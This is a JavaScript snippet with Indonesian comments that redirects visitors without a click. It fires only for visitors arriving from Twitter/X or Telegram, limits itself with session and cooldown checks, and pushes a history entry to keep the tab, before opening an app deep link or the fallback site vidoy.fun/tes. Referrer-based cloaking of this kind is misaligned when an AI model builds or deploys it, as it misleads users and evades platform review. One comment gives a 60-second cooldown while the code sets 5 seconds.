(function () {
  try {
    // === KONFIGURASI (GANTI BAGIAN INI SAJA) ===
    var fallbackUrl = "https://vidoy.fun/tes";        // fallback web (harus HTTPS)
    var appScheme   = "myapp";                        // skema app, contoh: "myapp"
    var appPath     = "/open?ref=tw";                 // path/query di dalam app
    var androidPkg  = "com.example.myapp";            // package Android kamu
    var cooldownMs  = 5 * 1000;                      // cooldown 60 detik agar tidak berulang

    // Contoh hasil deep link:
    // - ANDROID: intent://open?ref=tw#Intent;scheme=myapp;package=com.example.myapp;S.browser_fallback_url=https%3A%2F%2Fshinigami.bio;end
    // - iOS:     myapp://open?ref=tw  (fallback ke https://shinigami.bio kalau gagal)

    // --- validasi & bypass ---
    if (!/^https:\/\//i.test(fallbackUrl)) return;
    if (/[?#](?:.*[&?])?noredir=1(?:&|$)/i.test(location.search + location.hash)) return;

    // --- deteksi sumber: prioritas referrer, fallback UA ---
    var REF = String(document.referrer || "");
    var UA  = String(navigator.userAgent || "");
    var fromRef = /(t\.co|twitter\.com|t\.me|telegram\.org)/i.test(REF);
    var fromUA  = /(twitter|telegram)/i.test(UA);

    // --- hanya saat NAVIGATE pertama (bukan reload/back/forward) ---
    var nav = (performance.getEntriesByType && performance.getEntriesByType("navigation") || [])[0];
    var navType = nav && nav.type || "navigate";
    if (navType !== "navigate") return;

    // --- gate per-tab (anti-loop) ---
    var page = location.origin + location.pathname;
    var sessKey = "tw_tg_seen:" + page + "|deeplink";
    if (sessionStorage.getItem(sessKey)) return;

    // --- cooldown lintas tab/kunjungan ---
    var cdKey = "redirCooldown:" + page + "|deeplink";
    var now   = Date.now();
    var until = parseInt(localStorage.getItem(cdKey) || "0", 10);
    if (now < until) return;

    // --- izinkan hanya dari X/TG ---
    var allowed = fromRef || (!fromRef && fromUA);
    if (!allowed) return;

    // --- set gate dulu ---
    sessionStorage.setItem(sessKey, "1");
    localStorage.setItem(cdKey, String(now + cooldownMs));

    // --- platform detect ---
    var isAndroid = /Android/i.test(UA);
    var isIOS     = /iPhone|iPad|iPod/i.test(UA);

    // --- bantalan history agar tab tidak “hilang” saat user back dari app ---
    try {
      history.pushState({ hold: 1 }, "", location.href);
      // Jika masih hilang, boleh tambah satu lagi:
      // history.pushState({ hold: 2 }, "", location.href);
    } catch (_) {}

    // --- build deep links ---
    var encodedFallback = encodeURIComponent(fallbackUrl);
    var iosDeepLink     = appScheme + "://" + appPath.replace(/^\//, "");
    var androidIntent   =
      "intent://" + appPath.replace(/^\//, "") +
      "#Intent;scheme=" + encodeURIComponent(appScheme) +
      ";package=" + encodeURIComponent(androidPkg) +
      ";S.browser_fallback_url=" + encodedFallback + ";end";

    // --- eksekusi tanpa klik ---
    if (isAndroid) {
      // Android: Intent akan buka app kalau terpasang; kalau tidak, otomatis ke fallbackUrl
      location.href = androidIntent;
    } else if (isIOS) {
      // iOS: coba skema dulu, lalu fallback ke web setelah ~1 detik
      var start = Date.now();
      // Trik iOS: membuka skema
      location.href = iosDeepLink;

      // Jika gagal (app tidak terpasang), iOS tetap tinggal di halaman ini → fallback
      setTimeout(function () {
        // Jika halaman masih “aktif” setelah 1 detik, kita alihkan ke fallback web
        if (Date.now() - start < 1600) {
          try { location.href = fallbackUrl; } catch(_) {}
        }
      }, 1000);
    } else {
      // Desktop / lainnya: langsung ke fallback web
      location.href = fallbackUrl;
    }
  } catch (_) {}
})();
